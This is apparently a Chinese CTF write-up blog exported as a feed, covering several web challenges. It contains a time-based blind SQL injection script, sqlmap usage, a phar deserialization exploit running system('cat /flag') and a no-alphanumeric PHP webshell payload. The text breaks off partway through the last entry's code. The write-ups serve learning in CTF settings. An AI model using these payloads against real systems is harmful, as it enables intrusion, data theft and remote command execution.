检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。​```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bit’s Blog —-CISCN2021—初赛—WP（及部分解题思路）</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Avatar Uploader 1</title>
    <link href="/2021/05/24/BUU88/"/>
    <url>/2021/05/24/BUU88/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>打开环境  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png"><br>先随便输个进去看看<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png">     </p><p>文件上传   </p><p>尝试了几下，感觉没戏，只让上传PNG    </p><p>看下WP<br>给了源码    </p><p><code>upload.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);$session = <span class="hljs-keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);<span class="hljs-comment">// check whether file is uploaded</span><span class="hljs-keyword">if</span> (!file_exists($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);&#125;<span class="hljs-comment">// check file size</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);&#125;<span class="hljs-comment">// check file type</span>$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);finfo_close($finfo);<span class="hljs-keyword">if</span> (!in_array($type, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);&#125;<span class="hljs-comment">// check file width/height</span>$size = getimagesize($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || $size[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<span class="hljs-comment">// I hope this never happens...</span><span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);&#125;<span class="hljs-comment">// ok</span>$filename = bin2hex(random_bytes(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . $filename);$session-&gt;set(<span class="hljs-string">&#x27;avatar&#x27;</span>, $filename);flash(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);redirect(<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre></code></pre><p><code>getimagesize</code>函数返回的是一个数组     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png">      </p><p><code>[0]</code>和<code>[1]</code>分别是宽度和高度<br><code>[2]</code>是图片的类型    </p><pre><code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP       按此顺序的编号1=&gt;GIF、3=&gt;PNG     </code></pre><p>按源码的要求，需要<code>finfo_file()</code>为<code>imag/png</code>；而<code>getimagesize</code>得到的<code>$size[2]!==IMAGETYPE_PNG</code>       </p><p><code>finfo_file()</code>识别PNG文件十六进制下的第一行，删掉剩余的数据即可绕过<code>getimagesize()</code>    </p><p>所以用<code>winhex</code>对文件处理<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png">      </p><p>上传后即可得到flag   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>海洋大学CTF</title>
    <link href="/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
    <url>/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</url>
    
    <content type="html"><![CDATA[<h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="白给密码"><a href="#白给密码" class="headerlink" title="白给密码"></a>白给密码</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> datetimeurl=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    s=<span class="hljs-number">30</span>    l=<span class="hljs-number">127</span>    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(s&lt;l):        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))        payl=<span class="hljs-built_in">str</span>(pay)        print(payload)        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;        time1=datetime.datetime.now()        re=requests.post(url=url,data=data)        time2=datetime.datetime.now()        tem=(time2-time1).seconds        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):            s=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            l=mid        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre></code></pre><p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>得到的flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))    &#123;        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123;                 mkdir($filePath);                &#125;            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);        &#125;        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p><p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>git下来<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>一个类，eval命令执行    </p><p>但没有序列化，反序列化的点    </p><p><code>phar://</code>反序列化     </p><p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p><p>生成phar文件      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> TestObject();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.phar文件</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>$phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>$content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>$content=base64_encode($content);<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre><p>上传    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>访问     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GetShell</title>
    <link href="/2021/05/19/BUU87/"/>
    <url>/2021/05/19/BUU87/</url>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>打开环境，发现是文件上传，还给了部分源码</p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span>($contents=file_get_contents($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;    $data=substr($contents,<span class="hljs-number">5</span>);    <span class="hljs-keyword">foreach</span> ($black_char <span class="hljs-keyword">as</span> $b) &#123;        <span class="hljs-keyword">if</span> (stripos($data, $b) !== <span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);        &#125;    &#125;     &#125;</code></pre></code></pre><p>从给的源码得知会检查文件的内容第六位之后   </p><p>看WP似乎是过滤了数字和字母      </p><p>可用的符号<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神的无字母数字gethell</a>   </p><p>利用中文和取反操作得到字母    </p><p><code>echo ~(&#39;北&#39;)[1];</code>–&gt;s     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);$str = <span class="hljs-string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;mb_strlen($str, <span class="hljs-string">&#x27;utf-8&#x27;</span>); $i++)&#123;    $st = mb_substr($str, $i,<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);    $a = ~($st);    $b = $a[<span class="hljs-number">1</span>];<span class="hljs-comment">#取汉字的第一位</span>    <span class="hljs-keyword">if</span>($b==$_GET[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-comment">#$_GET[&#x27;a&#x27;]想要得到的字符</span>    &#123;        <span class="hljs-keyword">echo</span> $st;<span class="hljs-keyword">exit</span>;      <span class="hljs-comment">//~($st)[1]</span>    &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">P神</a>      </p><p>上面的EXP使用方法      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>构造payload<code>&lt;?=system($_POST[system]);&gt;</code><br>先构造数字1–&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];</code>       </p><p>_POST:<code>$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>最终的payload：<code>&lt;?=$__=[];$____=$__==$__;$_=~(北)[$____];$_.=~(熙)[$____];$_.=~(北)[$____];$_.=~(拾)[$____];$_.=~(的)[$____];$_.=~(和)[$____];$___=~(样)[$____];$___.=~(说)[$____];$___.=~(小)[$____];$___.=~(次)[$____];$___.=~(站)[$____];$____=~(瞰)[$____];$_($$___[$_]);</code>    </p><p>flag不在根目录下，在环境变量中<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>就不行，原因是PHP支持<code>变量函数</code>,也就是通过一个变量保存函数名，在变量后加上<code>()</code>即可调用函数；但是<code>eval</code>并不是一个函数，是PHP语法结构的一部分。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>getshell</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不是文件上传</title>
    <link href="/2021/05/15/BUU86/"/>
    <url>/2021/05/15/BUU86/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>题目说不是文件上传，看一下<code>www.zip</code>   </p><p>没有？？</p><p>看了WP，是<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>上搜索得到源码<img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>主要是<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image 